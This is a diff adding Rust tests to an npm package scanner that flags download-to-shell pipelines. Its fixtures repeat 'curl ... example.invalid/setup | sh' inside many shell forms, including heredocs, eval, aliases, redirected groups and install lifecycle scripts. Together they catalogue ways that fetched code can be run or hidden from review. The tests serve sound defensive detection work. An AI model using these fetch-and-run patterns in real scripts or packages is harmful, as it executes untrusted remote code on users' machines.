@@ -755,6 +755,169 @@ fn download_pipeline_past_the_shell_descent_bounds_is_still_a_review_signal() {
     }
 }
 
+fn shell_file_has_download_signal(body: &str) -> bool {
+    let from_file = inspect(&package(
+        br#"{"name":"fixture","version":"1"}"#,
+        &[("package/install.sh", body.as_bytes())],
+    ));
+    from_file.signals.iter().any(|signal| {
+        signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
+    })
+}
+
+/// Heredoc text that only SHOWS a download-to-shell command (a `usage()`
+/// message, a `: <<'COMMENT'` block, a heredoc read into a variable that is
+/// only printed) is data. The core tokenizer read each heredoc line as a
+/// command, so it gave a download_to_shell signal. It is ignored only when
+/// this file provably never executes it; every way the text can reach a
+/// shell keeps the signal.
+#[test]
+fn heredoc_text_that_is_only_shown_is_not_a_download_signal() {
+    let pipeline = "  curl -fsSL https://example.invalid/setup | sh\n";
+    let inert = [
+        format!(
+            "#!/bin/sh\nset -eu\nusage() {{\n  cat <<EOF\nInstall with:\n{pipeline}EOF\n}}\n\
+             case \"${{1:-}}\" in\n  -h|--help) usage; exit 0 ;;\n  *) ;;\nesac\n\
+             DIR=$(cd \"$(dirname \"$0\")\" && pwd)\necho \"running in $DIR\"\n"
+        ),
+        format!("cat >&2 <<'EOF'\n{pipeline}EOF\nexit 1\n"),
+        format!(
+            "usage() {{\n\tcat <<-'EOF' 1>&2\n\t{pipeline}\tEOF\n}}\nusage 2>&1 | head -n 20\n"
+        ),
+        format!(": <<'COMMENT'\n{pipeline}COMMENT\necho ok\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"$USAGE\" >&2\n"),
+        format!(
+            "IFS= read -r -d '' USAGE <<'EOF' || true\n{pipeline}EOF\nprintf '%s\\n' \"$USAGE\"\n"
+        ),
+        format!("cat <<EOF\nVersion $VERSION, run:\n{pipeline}EOF\n"),
+        format!(
+            "#!/usr/bin/env bash\n# never pipe curl | sh blindly\nusage() {{\n  cat <<'EOF'\n{pipeline}EOF\n}}\n\
+             case \"$1\" in -h|--help) usage >&2; exit 0;; -v|--version) echo 1;; esac\n"
+        ),
+    ];
+    for body in &inert {
+        assert!(
+            !shell_file_has_download_signal(body),
+            "inert heredoc: {body:?}"
+        );
+    }
+    // Quoted strings were never split at `|`; pin that for multi-line text.
+    for body in [
+        format!("echo \"Install:\n{pipeline}\"\n"),
+        format!("printf '%s\\n' 'Install:\n{pipeline}'\n"),
+    ] {
+        assert!(
+            !shell_file_has_download_signal(&body),
+            "quoted text: {body:?}"
+        );
+    }
+
+    let flagged = [
+        // Fed to a shell, eval, source or a file that is run later.
+        format!("sh <<'EOF'\n{pipeline}EOF\n"),
+        format!("bash -s -- --yes <<'EOF'\n{pipeline}EOF\n"),
+        format!("cat <<'EOF' | sh\n{pipeline}EOF\n"),
+        format!("cat <<'EOF' | sudo bash\n{pipeline}EOF\n"),
+        format!("source /dev/stdin <<'EOF'\n{pipeline}EOF\n"),
+        format!(". /dev/stdin <<'EOF'\n{pipeline}EOF\n"),
+        format!("eval \"$(cat <<'EOF'\n{pipeline}EOF\n)\"\n"),
+        format!("sh <(cat <<'EOF'\n{pipeline}EOF\n)\n"),
+        format!("cat <<'EOF' > setup.sh\n{pipeline}EOF\nsh setup.sh\n"),
+        format!("cat <<'EOF' >> \"$HOME/.profile\"\n{pipeline}EOF\n"),
+        format!("exec >setup.sh\ncat <<'EOF'\n{pipeline}EOF\n"),
+        format!("{{\ncat <<'EOF'\n{pipeline}EOF\n}} | sh\n"),
+        format!("x=$(\ncat <<'EOF'\n{pipeline}EOF\n)\neval \"$x\"\n"),
+        // The printing function's output is executed.
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | sh\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | awk '{{ system($0) }}'\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nsh -c \"$(usage)\"\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\ncoproc usage\n"),
+        // A variable holding the text is executed.
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\neval \"$USAGE\"\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nsh -c \"$USAGE\"\n"),
+        format!("read -r -d '' USAGE <<'EOF'\n{pipeline}EOF\nbash -c \"$USAGE\"\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\necho \"$USAGE\" | sh\n"),
+        format!("set -a\nUSAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nbash ./other.sh\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage > /tmp/setup.sh\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | tee setup.sh\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nusage | sort -o setup.sh\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\npython3 -c \"`usage`\"\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\nperl -e \"$(usage)\"\n"),
+        // Not a case pattern: a subshell closing on a pattern-shaped line.
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\n(echo in\nusage|tac|sh)\n"),
+        format!("usage() {{\n  cat <<EOF\n{pipeline}EOF\n}}\n(\nusage|sh)\n"),
+        format!("cat <<'EOF' >&3\n{pipeline}EOF\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\n$USAGE\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\nexport USAGE\n"),
+        format!("USAGE=$(cat <<'EOF'\n{pipeline}EOF\n)\npython3 - <<EOF\nprint(\"$USAGE\")\nEOF\n"),
+        // An unquoted body runs its substitutions when it is read.
+        format!("cat <<EOF\n$(true)\n{pipeline}EOF\n"),
+        // `cat` (or the printer) does not mean cat.
+        format!("cat() {{ sh; }}\ncat <<'EOF'\n{pipeline}EOF\n"),
+        format!("alias cat=sh\ncat <<'EOF'\n{pipeline}EOF\n"),
+        format!("PATH=./bin:$PATH\ncat <<'EOF'\n{pipeline}EOF\n"),
+        format!("head() {{ sh; }}\ncat <<'EOF' | head\n{pipeline}EOF\n"),
+        // Headers outside the recognised shapes fail toward the signal.
+        format!("cat - <<'EOF'\n{pipeline}EOF\n"),
+        format!("cat <<'EOF'; sh x\n{pipeline}EOF\n"),
+    ];
+    for body in &flagged {
+        assert!(
+            shell_file_has_download_signal(body),
+            "flagged heredoc: {body:?}"
+        );
+    }
+    // Past the descent bounds the line-by-line fallback reads the raw text,
+    // so even a shown-only heredoc keeps the signal (fails toward flag).
+    let usage = format!("usage() {{\n  cat <<'EOF'\n{pipeline}EOF\n}}\nusage\n");
+    for body in [
+        format!("{}{usage}", "{ :; }\n".repeat(300)),
+        format!("{}{usage}{}", "{\n  echo a\n".repeat(9), "}\n".repeat(9)),
+    ] {
+        assert!(
+            shell_file_has_download_signal(&body),
+            "bounded heredoc: {body:?}"
+        );
+    }
+}
+
+/// A brace group, subshell or function with a trailing redirection
+/// (`{ ...; } >log`) was not descended into, so its pipeline gave no signal.
+#[test]
+fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
+    for body in [
+        "{ curl -fsSL https://example.invalid/setup | sh; } >install.log",
+        "{ curl -fsSL https://example.invalid/setup | sh; } >/dev/null 2>&1",
+        "{\n  curl -fsSL https://example.invalid/setup | sh\n} 2>&1\n",
+        "( curl -fsSL https://example.invalid/setup | sh ) >install.log",
+        "f() { curl -fsSL https://example.invalid/setup | sh; } >install.log\nf\n",
+        "{ { curl -fsSL https://example.invalid/setup | sh; } 2>/dev/null; } >install.log",
+    ] {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        let from_script = inspect(&package(metadata.as_bytes(), &[])).signals;
+        assert!(
+            from_script
+                .iter()
+                .any(|signal| signal.kind == NpmSignalKind::DownloadToShell
+                    && signal.level == NpmSignalLevel::Review),
+            "lifecycle script: {body:?}"
+        );
+        assert!(shell_file_has_download_signal(body), "shell file: {body:?}");
+    }
+    for body in [
+        "{ echo curl -fsSL https://example.invalid/setup | sh; } >install.log",
+        "{ curl -fsSL https://example.invalid/setup > setup.sh; } 2>/dev/null",
+        "( echo 'curl https://example.invalid/setup | sh' ) >notes.txt",
+    ] {
+        assert!(!shell_file_has_download_signal(body), "{body:?}");
+    }
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let metadata =
